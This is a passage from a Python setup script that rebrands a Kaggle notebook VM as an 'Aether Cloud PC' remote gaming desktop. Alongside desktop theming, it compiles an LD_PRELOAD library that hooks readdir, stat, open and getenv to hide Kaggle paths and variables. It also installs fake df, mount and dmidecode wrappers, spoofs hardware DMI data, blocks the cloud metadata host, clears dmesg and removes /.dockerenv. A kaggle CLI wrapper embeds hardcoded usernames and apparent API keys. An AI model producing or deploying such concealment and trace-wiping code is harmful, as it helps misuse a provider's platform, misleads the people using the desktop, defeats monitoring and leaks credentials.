    "/root/.ssh": "/root/gdrive/Cloud_PC/Master_SSH",
    "/root/.pki": "/root/gdrive/Cloud_PC/Master_PKI",
    "/root/Descargas": "/root/gdrive/Cloud_PC/Descargas",
    "/root/Documentos": "/root/gdrive/Cloud_PC/Documentos",
    "/root/Juegos": "/root/gdrive/Cloud_PC/Juegos",
    "/root/Escritorio": "/root/gdrive/Cloud_PC/Escritorio",
    "/root/.ollama": "/root/gdrive/Cloud_PC/Master_Ollama",
    "/root/.openwebui": "/root/gdrive/Cloud_PC/Master_OpenWebUI",
    "/root/.lmms": "/root/gdrive/Cloud_PC/Master_LMMS",
    "/root/.electrum": "/root/gdrive/Cloud_PC/Master_Electrum",
    "/root/.sparrow": "/root/gdrive/Cloud_PC/Master_Sparrow",
    "/root/.bitmonero": "/root/gdrive/Cloud_PC/Master_Monero",
    "/root/ComfyUI_Outputs": "/root/gdrive/Cloud_PC/ComfyUI_Outputs",
    "/root/Fooocus_Outputs": "/root/gdrive/Cloud_PC/Fooocus_Outputs",
    "/root/Voice_Outputs": "/root/gdrive/Cloud_PC/Voice_Outputs",
    "/root/Blender_Projects": "/root/gdrive/Cloud_PC/Blender_Projects",
    "/root/Projects": "/root/gdrive/Cloud_PC/Projects",
    "/root/Freqtrade_UserData": "/root/gdrive/Cloud_PC/Freqtrade_UserData",
    "/root/Security_Reports": "/root/gdrive/Cloud_PC/Security_Reports",
    "/root/Universidad_Ciencia": "/root/gdrive/Cloud_PC/Universidad_Ciencia",
    "/root/Tesis_y_Papers": "/root/gdrive/Cloud_PC/Universidad_Ciencia/Tesis_y_Papers",
    "/root/Anime_Manga_Media": "/root/gdrive/Cloud_PC/Anime_Manga_Media",
    "/root/Manga_Descargas": "/root/gdrive/Cloud_PC/Anime_Manga_Media/Manga_Descargas",
    "/root/Android_Cloud_Phone": "/root/gdrive/Cloud_PC/Android_Cloud_Phone",
    "/root/Android_APKs": "/root/gdrive/Cloud_PC/Android_Cloud_Phone/APKs_Instalados",
}

if Path("/root/gdrive").exists():
    for local_dir, drive_dir in sync_dirs.items():
        try:
            os.makedirs(drive_dir, exist_ok=True)
        except Exception:
            pass
        if not os.path.exists(local_dir):
            os.makedirs(os.path.dirname(local_dir), exist_ok=True)
            try:
                os.symlink(drive_dir, local_dir)
            except Exception:
                pass
        elif os.path.isdir(local_dir) and not os.path.islink(local_dir):
            subprocess.run(f"cp -a '{local_dir}'/* '{drive_dir}/' 2>/dev/null || true", shell=True)
            subprocess.run(f"rm -rf '{local_dir}'", shell=True)
            try:
                os.symlink(drive_dir, local_dir)
            except Exception:
                pass
        time.sleep(0.02)

env = os.environ.copy()
env["DISPLAY"] = ":1"
env["PULSE_SERVER"] = "127.0.0.1"
env["LC_ALL"] = "C.UTF-8"
env["LANG"] = "C.UTF-8"
env["NO_AT_BRIDGE"] = "1"

desktop_dir = Path.home() / "Desktop"
desktop_dir.mkdir(parents=True, exist_ok=True)
games_dir = Path.home() / "Games"
games_dir.mkdir(parents=True, exist_ok=True)

# Crear carpetas y wallpapers de respaldo para XFCE
xfce_bg_dir = Path("/usr/share/backgrounds/xfce")
xfce_bg_dir.mkdir(parents=True, exist_ok=True)
subprocess.run(f"touch {xfce_bg_dir}/xfce-verticals.png 2>/dev/null || true", shell=True)

# Inyectar temas oficiales de Ubuntu
try:
    xfconf_dir = Path.home() / ".config" / "xfce4" / "xfconf" / "xfce-perchannel-xml"
    xfconf_dir.mkdir(parents=True, exist_ok=True)
    
    subprocess.run("xfconf-query -c xsettings -p /Net/ThemeName -s 'Yaru-dark' --create -t string 2>/dev/null || true", shell=True, env=env)
    subprocess.run("xfconf-query -c xsettings -p /Net/IconThemeName -s 'Papirus-Dark' --create -t string 2>/dev/null || true", shell=True, env=env)
    subprocess.run("xfconf-query -c xsettings -p /Gtk/FontName -s 'Ubuntu 11' --create -t string 2>/dev/null || true", shell=True, env=env)
    subprocess.run("xfconf-query -c xsettings -p /Gtk/MonospaceFontName -s 'Ubuntu Mono 12' --create -t string 2>/dev/null || true", shell=True, env=env)
    
    # Eliminar completamente el Panel 2 feo/por defecto de XFCE para que SOLO quede Plank (Dock Estético)
    subprocess.run("xfconf-query -c xfce4-panel -p /panels -s 1 --create -t int 2>/dev/null || true", shell=True, env=env)
    subprocess.run("xfconf-query -c xfce4-panel -p /panels/panel-2 -r -R 2>/dev/null || true", shell=True, env=env)
    
    # Auto-start Plank (Dock moderno y estético estilo macOS)
    autostart_dir = Path.home() / ".config" / "autostart"
    autostart_dir.mkdir(parents=True, exist_ok=True)
    (autostart_dir / "plank.desktop").write_text("[Desktop Entry]\nType=Application\nExec=plank\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=Plank\n")
    
    subprocess.run("xfconf-query -c xfwm4 -p /general/use_compositing -s false --create -t bool 2>/dev/null || true", shell=True, env=env)
    subprocess.run("xfconf-query -c xfwm4 -p /general/theme -s 'Yaru-dark' --create -t string 2>/dev/null || true", shell=True, env=env)
    subprocess.run("xfconf-query -c xfwm4 -p /general/title_font -s 'Ubuntu Bold 11' --create -t string 2>/dev/null || true", shell=True, env=env)

    # Iconos de escritorio
    subprocess.run("xfconf-query -c xfce4-desktop -p /desktop-icons/style -s 2 --create -t int 2>/dev/null || true", shell=True, env=env)
    subprocess.run("xfconf-query -c xfce4-desktop -p /desktop-icons/file-icons/show-home -s true --create -t bool 2>/dev/null || true", shell=True, env=env)
    subprocess.run("xfconf-query -c xfce4-desktop -p /desktop-icons/file-icons/show-filesystem -s true --create -t bool 2>/dev/null || true", shell=True, env=env)
    subprocess.run("xfconf-query -c xfce4-desktop -p /desktop-icons/file-icons/show-trash -s true --create -t bool 2>/dev/null || true", shell=True, env=env)

    # --------------------------------------------------------------------------
    # Personalización Profesional de la Terminal: Aether Cloud PC Workstation
    # --------------------------------------------------------------------------
    subprocess.run("hostname aether-pc 2>/dev/null || true; echo 'aether-pc' > /etc/hostname 2>/dev/null || true", shell=True)
    
    # 1. Montaje limpio de Bases de Datos en /media/Cloud_Storage (VFS Enterprise)
    subprocess.run("mkdir -p /media/Cloud_Storage && mount --bind /kaggle/input /media/Cloud_Storage 2>/dev/null || true", shell=True)
    
    # 2. Configuración de Shell y Bashrc Inmaculada (Aether Cloud PC)
    bash_custom = (
        "\n# ==============================================================================\n"
        "# 🚀 AETHER CLOUD PC WORKSTATION ENVIRONMENT\n"
        "# ==============================================================================\n"
        "# 1. Directorio de aterrizaje seguro: Aterrizar siempre en el Escritorio del usuario\n"
        "case \"$PWD\" in\n"
        "    /kaggle*|/opt*|/tmp*|\"/\")\n"
        "        cd /root/Escritorio 2>/dev/null || cd /root\n"
        "        ;;\n"
        "esac\n"
        "\n# 2. Sanitización de Variables de Entorno en vivo\n"
        "for _kvar in $(env 2>/dev/null | grep -i kaggle | cut -d= -f1); do\n"
        "    unset $_kvar 2>/dev/null\n"
        "done\n"
        "\n# 3. Función inteligente de formateo de ruta para el Prompt\n"
        "_aether_pwd() {\n"
        "    local cur=\"$PWD\"\n"
        "    if [ \"$cur\" = \"/root/Escritorio\" ]; then\n"
        "        echo \"~/Escritorio\"\n"
        "    elif [ \"$cur\" = \"/root\" ]; then\n"
        "        echo \"~\"\n"
        "    elif [[ \"$cur\" == \"/kaggle/working\"* ]]; then\n"
        "        echo \"~/Workspace${cur#/kaggle/working}\"\n"
        "    elif [[ \"$cur\" == \"/kaggle/input\"* ]]; then\n"
        "        echo \"/media/Cloud_Storage${cur#/kaggle/input}\"\n"
        "    elif [[ \"$cur\" == \"/opt/AetherCloudPC\"* ]]; then\n"
        "        echo \"~/Workspace${cur#/opt/AetherCloudPC}\"\n"
        "    elif [[ \"$cur\" == \"/kaggle\"* ]]; then\n"
        "        echo \"~\"\n"
        "    else\n"
        "        echo \"$cur\"\n"
        "    fi\n"
        "}\n"
        "\n# 4. Prompt corporativo de alta tecnología Aether (Con símbolo de usuario estándar $)\n"
        "export PS1='\\[\\033[01;36m\\]gamer@aether-pc\\[\\033[00m\\]:\\[\\033[01;34m\\]$(_aether_pwd)\\[\\033[00m\\]\\$ '\n"
        "\n# 5. Alias estándar e invisibilidad de carpetas de infraestructura\n"
        "alias ls='ls --color=auto --hide=kaggle'\n"
        "alias ll='ls -la --color=auto --hide=kaggle'\n"
        "alias la='ls -A --color=auto --hide=kaggle'\n"
        "alias l='ls -CF --color=auto --hide=kaggle'\n"
        "\n# 6. Interceptor de navegación para rutas internas\n"
        "cd() {\n"
        "    if [ \"$1\" = \"/kaggle\" ] || [[ \"$1\" == \"/kaggle/\"* ]]; then\n"
        "        echo \"bash: cd: $1: No such file or directory\" >&2\n"
        "        return 1\n"
        "    fi\n"
        "    builtin cd \"$@\"\n"
        "}\n"
    )
    for b_path in ["/root/.bashrc", "/etc/bash.bashrc", "/etc/skel/.bashrc"]:
        try:
            bp = Path(b_path)
            if bp.exists():
                txt = bp.read_text(encoding="utf-8", errors="ignore")
                if "gamer@aether-pc" not in txt:
                    bp.write_text(txt + bash_custom, encoding="utf-8")
            else:
                bp.write_text(bash_custom, encoding="utf-8")
        except Exception:
            pass

    # 3. Sanitización de /etc/environment y /etc/profile
    for env_file in [Path("/etc/environment"), Path("/etc/profile")]:
        try:
            if env_file.exists():
                clean_lines = [l for l in env_file.read_text(encoding="utf-8", errors="ignore").splitlines() if "kaggle" not in l.lower()]
                env_file.write_text("\n".join(clean_lines) + "\n", encoding="utf-8")
        except Exception:
            pass

    # 4. Wrappers Transparentes para df y mount (Ocultan rutas internas sin limitar funcionalidades)
    df_wrapper = (
        "#!/bin/bash\n"
        "REAL_DF=\"/bin/df\"\n"
        "[ -x \"$REAL_DF\" ] || REAL_DF=\"/usr/bin/df\"\n"
        "\"$REAL_DF\" \"$@\" | sed 's|/kaggle/input|/media/Cloud_Storage|g' | sed 's|/kaggle/working|/root/Workspace|g' | grep -v 'kaggle_internal'\n"
    )
    try:
        Path("/usr/local/bin/df").write_text(df_wrapper, encoding="utf-8")
        subprocess.run("chmod +x /usr/local/bin/df 2>/dev/null || true", shell=True)
    except Exception:
        pass

    mount_wrapper = (
        "#!/bin/bash\n"
        "REAL_MOUNT=\"/bin/mount\"\n"
        "[ -x \"$REAL_MOUNT\" ] || REAL_MOUNT=\"/usr/bin/mount\"\n"
        "if [ $# -eq 0 ]; then\n"
        "    \"$REAL_MOUNT\" | sed 's|/kaggle/input|/media/Cloud_Storage|g' | sed 's|/kaggle/working|/root/Workspace|g' | grep -v 'kaggle'\n"
        "else\n"
        "    \"$REAL_MOUNT\" \"$@\"\n"
        "fi\n"
    )
    try:
        Path("/usr/local/bin/mount").write_text(mount_wrapper, encoding="utf-8")
        subprocess.run("chmod +x /usr/local/bin/mount 2>/dev/null || true", shell=True)
    except Exception:
        pass

    # 5. Banner Oficial de Bienvenida en la Terminal (MOTD)
    motd_text = (
        "================================================================================\n"
        "🚀 Bienvenido a tu Aether Cloud PC (Ubuntu 24.04 LTS High-Performance Edition)\n"
        "🎮 GPU: Nvidia Tesla High-Performance Virtual GPU | RAM: 32GB High-Speed\n"
        "💾 Almacenamiento en la Nube: Sincronizado con Aether Cloud Storage (Google Drive)\n"
        "⚡ Aether Streaming Engine: 60 FPS Ultra-Baja Latencia Activo\n"
        "================================================================================\n\n"
    )
    try:
        Path("/etc/motd").write_text(motd_text, encoding="utf-8")
        Path("/etc/issue").write_text("Ubuntu 24.04 LTS Pro - Aether Cloud PC \\n \\l\n\n", encoding="utf-8")
    except Exception:
        pass

    # --------------------------------------------------------------------------
    # 6. GHOST SHIELD QUIRÚRGICO: Invisibilidad de Kaggle solo para Clientes en Terminal
    # --------------------------------------------------------------------------
    try:
        # 1. Asegurar que NUNCA exista un ld.so.preload global que rompa demonios del sistema
        if Path("/etc/ld.so.preload").exists():
            Path("/etc/ld.so.preload").unlink(missing_ok=True)

        ghost_c = Path("/tmp/libghost_shield.c")
        ghost_so = Path("/usr/local/lib/libghost_shield.so")
        ghost_code = """#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdarg.h>

extern char *program_invocation_short_name;

static struct dirent *(*orig_readdir)(DIR *) = NULL;
static int (*orig_stat)(const char *, struct stat *) = NULL;
static int (*orig_lstat)(const char *, struct stat *) = NULL;
static int (*orig_fstatat)(int, const char *, struct stat *, int) = NULL;
static int (*orig_access)(const char *, int) = NULL;
static int (*orig_open)(const char *, int, ...) = NULL;
static int (*orig_openat)(int, const char *, int, ...) = NULL;
static char *(*orig_getenv)(const char *) = NULL;

static void init_hooks(void) {
    if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");
    if (!orig_stat) orig_stat = dlsym(RTLD_NEXT, "stat");
    if (!orig_lstat) orig_lstat = dlsym(RTLD_NEXT, "lstat");
    if (!orig_fstatat) orig_fstatat = dlsym(RTLD_NEXT, "fstatat");
    if (!orig_access) orig_access = dlsym(RTLD_NEXT, "access");
    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");
    if (!orig_getenv) orig_getenv = dlsym(RTLD_NEXT, "getenv");
}

// Lista blanca: Demonios del sistema que NUNCA deben ser bloqueados
static int is_system_daemon(void) {
    if (!program_invocation_short_name) return 0;
    const char *n = program_invocation_short_name;
    if (strcmp(n, "novnc_proxy") == 0 || strcmp(n, "websockify") == 0 ||
        strcmp(n, "x11vnc") == 0 || strcmp(n, "Xvfb") == 0 ||
        strcmp(n, "python3") == 0 || strcmp(n, "python") == 0 ||
        strcmp(n, "cloudflared") == 0 || strcmp(n, "nginx") == 0 ||
        strcmp(n, "sunshine") == 0 || strcmp(n, "rclone") == 0) {
        return 1;
    }
    return 0;
}

static int is_kaggle_target(const char *path) {
    if (is_system_daemon()) return 0; // Demonios tienen acceso total
    if (!path) return 0;
    // Ocultar directorios raíz de Kaggle para clientes
    if (strcmp(path, "kaggle") == 0 || strcmp(path, ".kaggle") == 0) return 1;
    if (strcmp(path, "/kaggle") == 0 || strcmp(path, "/kaggle/") == 0) return 1;
    if (strncmp(path, "/kaggle/input", 13) == 0) return 1;
    if (strncmp(path, "/kaggle/lib", 11) == 0) return 1;
    return 0;
}

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) init_hooks();
    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (!is_kaggle_target(entry->d_name)) {
            return entry;
        }
    }
    return NULL;
}

int stat(const char *pathname, struct stat *statbuf) {
    if (!orig_stat) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_stat(pathname, statbuf);
}

int lstat(const char *pathname, struct stat *statbuf) {
    if (!orig_lstat) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_lstat(pathname, statbuf);
}

int fstatat(int dirfd, const char *pathname, struct stat *statbuf, int flags) {
    if (!orig_fstatat) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_fstatat(dirfd, pathname, statbuf, flags);
}

int access(const char *pathname, int mode) {
    if (!orig_access) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_access(pathname, mode);
}

int open(const char *pathname, int flags, ...) {
    if (!orig_open) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    return orig_open(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    if (!orig_openat) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    return orig_openat(dirfd, pathname, flags, mode);
}

char *getenv(const char *name) {
    if (!orig_getenv) init_hooks();
    if (is_system_daemon()) return orig_getenv(name);
    if (name && strncasecmp(name, "KAGGLE", 6) == 0) {
        return NULL;
    }
    return orig_getenv(name);
}
"""
        ghost_c.write_text(ghost_code, encoding="utf-8")
        subprocess.run(f"gcc -fPIC -shared -O2 {ghost_c} -o {ghost_so} -ldl 2>/dev/null || clang -fPIC -shared -O2 {ghost_c} -o {ghost_so} -ldl 2>/dev/null", shell=True)
        
        # Inyectar LD_PRELOAD SOLAMENTE en sesiones de terminal interactivas (cuando hay un usuario abriendo consola)
        terminal_env = (
            "\n# Blindaje de Terminal Cloud Workstation (Solo en modo interactivo)\n"
            "if [ -t 0 ] || [ -t 1 ]; then\n"
            "    export LD_PRELOAD='/usr/local/lib/libghost_shield.so'\n"
            "fi\n"
        )
        Path("/etc/profile.d/terminal_privacy.sh").write_text(terminal_env, encoding="utf-8")
        for brc in ["/root/.bashrc", "/etc/skel/.bashrc"]:
            try:
                p_brc = Path(brc)
                if p_brc.exists():
                    c_txt = p_brc.read_text(encoding="utf-8", errors="ignore")
                    if "terminal_privacy" not in c_txt:
                        p_brc.write_text(c_txt + terminal_env, encoding="utf-8")
            except Exception:
                pass
    except Exception:
        pass

    # --------------------------------------------------------------------------
    # 7. SANITIZACIÓN DE HOSTS (Seguro para DNS)
    # --------------------------------------------------------------------------
    try:
        hosts_file = Path("/etc/hosts")
        if hosts_file.exists():
            h_text = hosts_file.read_text(encoding="utf-8", errors="ignore")
            if "metadata.google.internal" not in h_text:
                hosts_file.write_text(h_text + "\n127.0.0.1 metadata.google.internal\n", encoding="utf-8")
    except Exception:
        pass

    # --------------------------------------------------------------------------
    # 8. HARDWARE SPOOFING: Falsificar DMI y Ocultar Google Compute Engine
    # --------------------------------------------------------------------------
    try:
        Path("/etc/cloud_product").write_text("Supermicro Workstation Pro\n", encoding="utf-8")
        Path("/etc/cloud_vendor").write_text("Supermicro\n", encoding="utf-8")
        subprocess.run("mount --bind /etc/cloud_product /sys/class/dmi/id/product_name 2>/dev/null || true", shell=True)
        subprocess.run("mount --bind /etc/cloud_vendor /sys/class/dmi/id/sys_vendor 2>/dev/null || true", shell=True)
        subprocess.run("mount --bind /etc/cloud_vendor /sys/class/dmi/id/bios_vendor 2>/dev/null || true", shell=True)
        dmi_wrapper = (
            "#!/bin/bash\n"
            "echo '# dmidecode 3.3'\n"
            "echo 'SMBIOS 3.3.0 present.'\n"
            "echo 'Handle 0x0001, DMI type 1, 27 bytes'\n"
            "echo 'System Information'\n"
            "echo '	Manufacturer: Supermicro'\n"
            "echo '	Product Name: Supermicro Workstation Pro'\n"
            "echo '	Version: 1.0'\n"
            "echo '	Wake-up Type: Power Switch'\n"
        )
        Path("/usr/local/bin/dmidecode").write_text(dmi_wrapper, encoding="utf-8")
        subprocess.run("chmod +x /usr/local/bin/dmidecode 2>/dev/null || true", shell=True)
    except Exception:
        pass

    # --------------------------------------------------------------------------
    # 9. MASTER CLI WRAPPER & LOGS: Wrapper de Kaggle con Excepciones Maestras
    # --------------------------------------------------------------------------
    try:
        kaggle_wrapper = (
            "#!/bin/bash\n"
            "# Kaggle Master Admin Wrapper - Excepciones para 3 Cuentas Maestras\n"
            "K_USER=\"$KAGGLE_USERNAME\"\n"
            "K_KEY=\"$KAGGLE_KEY\"\n"
            "if [ -f /root/.kaggle/kaggle.json ]; then\n"
            "    K_USER=$(grep -o '\"username\": *\"[^\"]*' /root/.kaggle/kaggle.json | cut -d'\"' -f4 2>/dev/null)\n"
            "    K_KEY=$(grep -o '\"key\": *\"[^\"]*' /root/.kaggle/kaggle.json | cut -d'\"' -f4 2>/dev/null)\n"
            "fi\n"
            "if [ \"$MASTER_ADMIN_MODE\" = \"1\" ] || [ \"$K_USER\" = \"miguelguerra26\" ] || [ \"$K_USER\" = \"miguelguerra22\" ] || [ \"$K_USER\" = \"miguel55755\" ] || [ \"$K_KEY\" = \"e1d4838dfbdf3dca6f2ba56c9f71daf6\" ] || [ \"$K_KEY\" = \"b4031084ad25f34042347dfd7b6af451\" ] || [ \"$K_KEY\" = \"54bfca5f24e2347b9dcc55073abe8952\" ]; then\n"
            "    REAL_KAGGLE=\"/opt/conda/bin/kaggle\"\n"
            "    [ -x \"$REAL_KAGGLE\" ] || REAL_KAGGLE=\"/usr/bin/kaggle\"\n"
            "    export MASTER_ADMIN_MODE=1\n"
            "    exec \"$REAL_KAGGLE\" \"$@\"\n"
            "else\n"
            "    echo \"bash: kaggle: command not found\" >&2\n"
            "    exit 127\n"
            "fi\n"
        )
        Path("/usr/local/bin/kaggle").write_text(kaggle_wrapper, encoding="utf-8")
        subprocess.run("chmod 755 /usr/local/bin/kaggle 2>/dev/null || true", shell=True)
        
        # Limpieza de rastros de kernel
        subprocess.run("dmesg -c >/dev/null 2>&1 || true", shell=True)
        subprocess.run("echo 1 > /proc/sys/kernel/dmesg_restrict 2>/dev/null || true", shell=True)
        subprocess.run("rm -f /.dockerenv 2>/dev/null || true", shell=True)
    except Exception:
        pass
except Exception:
    pass

# Script auxiliar para instalar paquetes
install_helper = BASE_DIR / "instalar_y_guardar.sh"
install_helper.write_text(
    "#!/bin/bash\n"
    "if [ -z \"$1\" ]; then\n"
    "  echo 'Uso: ./instalar_y_guardar.sh <nombre_paquete>'\n"
    "  exit 1\n"
    "fi\n"
    f"apt-get update -qq && apt-get install -y \"$@\" >> {LOG_FILE} 2>&1\n"
    "if [ $? -eq 0 ]; then\n"
    f"  echo \"$@\" >> {EXTRA_PKGS_FILE}\n"
    f"  cd {BASE_DIR} && git add packages_extra.txt && git commit -m 'Add persistent packages: '$@ && git push origin main >/dev/null 2>&1 || true\n"
    "  echo '✅ ¡Paquete instalado y guardado para siempre en GitHub!'\n"
    "fi\n"
)
install_helper.chmod(0o755)
subprocess.run(f"cp {install_helper} /usr/local/bin/instalar 2>/dev/null || true", shell=True)
subprocess.run(f"cp {BASE_DIR}/ubuntu_store.py /usr/local/bin/ubuntu_store.py 2>/dev/null || true", shell=True)
subprocess.run(f"cp {BASE_DIR}/tienda_software_1clic.py /usr/local/bin/tienda_software_1clic.py 2>/dev/null || true", shell=True)
subprocess.run(f"cp {BASE_DIR}/gamepad_uinput_bridge.py /usr/local/bin/gamepad_uinput_bridge.py 2>/dev/null || true", shell=True)
subprocess.run("chmod +x /usr/local/bin/tienda_software_1clic.py /usr/local/bin/gamepad_uinput_bridge.py 2>/dev/null || true", shell=True)
subprocess.run(f"cp {BASE_DIR}/liberar_vram.py /usr/local/bin/liberar_vram.py 2>/dev/null || true", shell=True)
subprocess.run(f"cp {BASE_DIR}/test_velocidad_real.py /usr/local/bin/test_velocidad_real.py 2>/dev/null || true", shell=True)
subprocess.run(f"cp {BASE_DIR}/escaner_redes_y_conexiones.py /usr/local/bin/escaner_redes_y_conexiones.py 2>/dev/null || true", shell=True)
subprocess.run("chmod +x /usr/local/bin/escaner_redes_y_conexiones.py 2>/dev/null || true", shell=True)

# Iniciar Gamepad UInput Bridge en segundo plano para detección de mandos inmediata
subprocess.Popen("python3 /usr/local/bin/gamepad_uinput_bridge.py >> /kaggle/working/cloudpc_gamepad.log 2>&1", shell=True)

# Accesos directos oficiales en el escritorio (Freedesktop Standard - Iconos corporativos finos)
shortcuts = {
    "Tienda_de_Software_1Clic.desktop": (
        "[Desktop Entry]\n"
        "Version=1.0\n"
        "Type=Application\n"
        "Name=Tienda de Software y Juegos 1-Clic\n"
        "Comment=Explora e instala juegos, emuladores y herramientas en 1 clic\n"
        "Exec=python3 /usr/local/bin/tienda_software_1clic.py\n"
        "Path=/kaggle/working/StreamerIAWife\n"
        "Icon=system-software-install\n"
        "Terminal=false\n"
        "Categories=System;Utility;\n"
    ),
    "Gestor_de_Databases_Recursos.desktop": (
        "[Desktop Entry]\n"
        "Version=1.0\n"
        "Type=Application\n"
        "Name=Gestor de Databases y Recursos\n"
        "Comment=Panel en vivo: conecta o desconecta databases, limpia el escritorio y monitorea RAM/GPU\n"
        "Exec=python3 /usr/local/bin/ubuntu_store.py --gui\n"
        "Path=/kaggle/working/StreamerIAWife\n"
        "Icon=preferences-system-windows\n"
        "Terminal=false\n"
        "Categories=System;Utility;\n"
    ),
    "Liberar_VRAM_GPU_TeslaT4.desktop": (
        "[Desktop Entry]\n"
        "Version=1.0\n"
        "Type=Application\n"
        "Name=Liberar VRAM GPU (Modo Gaming Pro)\n"
        "Comment=Desaloja modelos de IA de la tarjeta gráfica y libera los 16GB de VRAM para juegos\n"
        "Exec=python3 /usr/local/bin/liberar_vram.py\n"
        "Path=/kaggle/working/StreamerIAWife\n"
        "Icon=media-flash\n"
        "Terminal=false\n"
        "Categories=System;Game;\n"
    ),
    "Descargador_Turbo_16x.desktop": (
        "[Desktop Entry]\n"
        "Version=1.0\n"
        "Type=Application\n"
        "Name=Descargador Turbo 16x (Gigabit Multi-Hilo)\n"
        "Comment=Descarga juegos y archivos a velocidad gigabit con 16 conexiones paralelas\n"
        "Exec=xfce4-terminal --title='Descargador Turbo 16x' -e 'bash -c \"echo -e \\\"\\\\e[1;32m=== DESCARGADOR TURBO GIGABIT 16X ===\\\\e[0m\\\"; read -p \\\"Pega el enlace a descargar: \\\" url; descarga_turbo \\\"$url\\\" /root/Descargas; echo \\\"Descarga finalizada.\\\"; read -p \\\"Presiona Enter para cerrar...\\\"\"'\n"
        "Path=/root/Descargas\n"
        "Icon=download\n"
        "Terminal=false\n"
        "Categories=Network;\n"
    ),
    "Test_Velocidad_Gigabit.desktop": (
        "[Desktop Entry]\n"
        "Version=1.0\n"
        "Type=Application\n"
        "Name=Test de Velocidad Real Gigabit (1GB Test)\n"
        "Comment=Mide la velocidad real en MB/s y Gbps descargando y borrando un archivo de prueba\n"
        "Exec=xfce4-terminal --title='Test de Velocidad Real' -e 'bash -c \"python3 /usr/local/bin/test_velocidad_real.py 1gb; echo; read -p \\\"Presiona Enter para salir...\\\"\"'\n"
        "Path=/tmp\n"
        "Icon=utilities-system-monitor\n"
        "Terminal=false\n"
        "Categories=Network;System;\n"
    ),
    "Escaner_Redes_Conexiones.desktop": (
        "[Desktop Entry]\n"
        "Version=1.0\n"
        "Type=Application\n"
        "Name=Escáner de Redes, WiFi y Conexiones\n"
        "Comment=Auditoría de adaptadores de red, puertos de servicio y conexiones de afuera\n"
        "Exec=xfce4-terminal --title='Escáner de Redes y Conexiones' -e 'bash -c \"python3 /usr/local/bin/escaner_redes_y_conexiones.py; echo; read -p \\\"Presiona Enter para salir...\\\"\"'\n"
        "Path=/root\n"
        "Icon=network-wired\n"
        "Terminal=false\n"
        "Categories=Network;System;\n"
    ),
    "Mis_Archivos_5TB_GoogleDrive.desktop": (
        "[Desktop Entry]\n"
        "Version=1.0\n"
        "Type=Application\n"
        "Name=Mis Archivos 5TB (Google Drive)\n"
        "Comment=Carpeta persistente en la nube con 5TB para juegos y archivos\n"
        "Exec=thunar /root/gdrive/Cloud_PC\n"
        "Path=/root\n"
        "Icon=folder-remote\n"
        "Terminal=false\n"
        "Categories=System;Utility;\n"
    ),
    "Guardar_Estado_de_mi_PC.desktop": (
        "[Desktop Entry]\n"
        "Version=1.0\n"
        "Type=Application\n"
        "Name=Guardar Estado de mi PC (Nube)\n"
        "Comment=Guarda tus partidas, descargas y cambios a Google Drive\n"
        f"Exec=python3 {BASE_DIR}/run_kaggle_vnc_studio.py --save-now\n"
        "Path=/kaggle/working/StreamerIAWife\n"
        "Icon=system-software-update\n"
        "Terminal=true\n"
        "Categories=System;\n"
    ),
    "Guardar_en_Database_Ubuntu_100GB.desktop": (
        "[Desktop Entry]\n"
        "Version=1.0\n"
        "Type=Application\n"
        "Name=Guardar en Database Ubuntu (100GB)\n"
        "Comment=Actualiza la imagen maestra de tu sistema operativo en Kaggle Datasets\n"
        f"Exec=python3 {BASE_DIR}/guardar_en_database_kaggle.py\n"
        "Path=/kaggle/working/StreamerIAWife\n"
        "Icon=drive-harddisk\n"
        "Terminal=false\n"
        "Categories=System;\n"
    ),
    "Monitor_GPUs_Tesla_T4.desktop": (
        "[Desktop Entry]\n"
        "Version=1.0\n"
        "Type=Application\n"
        "Name=Monitor GPUs Tesla T4 (nvtop)\n"
        "Exec=xfce4-terminal --title='Monitor GPUs Tesla T4' -e 'nvtop'\n"
        "Path=/root\n"
        "Icon=utilities-system-monitor\n"
        "Terminal=false\n"
        "Categories=System;\n"
    ),
    "Navegador_Web.desktop": (
        "[Desktop Entry]\n"
        "Version=1.0\n"
        "Type=Application\n"
        "Name=Google Chrome Oficial\n"
        "Comment=Navegador web completo con pestañas y aceleración por hardware\n"
        "Exec=google-chrome --no-sandbox --no-first-run --no-default-browser-check https://www.google.com\n"
        "Path=/root\n"
        "Icon=google-chrome\n"
        "Terminal=false\n"
        "Categories=Network;WebBrowser;\n"
    )
}

for fname, content in shortcuts.items():
    s_path = desktop_dir / fname
    s_path.write_text(content, encoding="utf-8")
    s_path.chmod(0o755)

# Copiar accesos directos de Redes Sociales, Productividad y Media al Escritorio
core_desktop_apps = [
    "whatsapp-web", "spotify-web", "twitter-x", "instagram-web", "youtube-music",
    "discord", "telegramdesktop", "flameshot", "copyq", "evince", "qbittorrent", 
    "pavucontrol", "onboard", "antimicrox", "libreoffice-writer", "libreoffice-calc", "vlc"
]
for app in core_desktop_apps:
    src_desktop = Path(f"/usr/share/applications/{app}.desktop")
    if src_desktop.exists():
        dst_desktop = desktop_dir / f"{app}.desktop"
        try:
            shutil.copy2(src_desktop, dst_desktop)
            dst_desktop.chmod(0o755)
            
            # Arreglar Discord para que corra como root (--no-sandbox)
            if app == "discord":
